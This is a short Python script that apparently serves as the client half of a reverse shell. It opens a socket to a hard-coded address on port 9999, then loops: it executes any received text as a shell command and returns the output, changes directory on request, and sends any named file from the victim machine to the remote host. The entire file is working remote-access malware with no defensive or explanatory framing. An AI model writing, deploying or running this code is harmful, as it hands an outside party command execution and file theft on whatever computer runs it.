import socket
import os
import time
import subprocess

s = socket.socket()
host = '192.168.43.213'
port = 9999
SEPARATOR="<SEPARATOR"
BUFFER_SIZE=1024
s.connect((host, port))

while True:
    data = s.recv(1024)
    try:
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
    except:
        s.send("No Such Directory".encode())
    try:
        if len(data) > 0:
            if data[:4].decode("utf-8")=='send':
                try:
                    filename=data[5:].decode("utf-8")
                    #print(filename)
                    filesize=os.path.getsize(filename)
                    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
                    with open(filename, "rb") as file:
                        data=file.read(filesize)
                        s.send(data)
                except:
                    print("error sending file")
            else:
                cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
                currentWD = os.getcwd() + "> "
                s.send(str.encode(output_str + currentWD))
                #print(output_str)
    except:
        print("command not found")
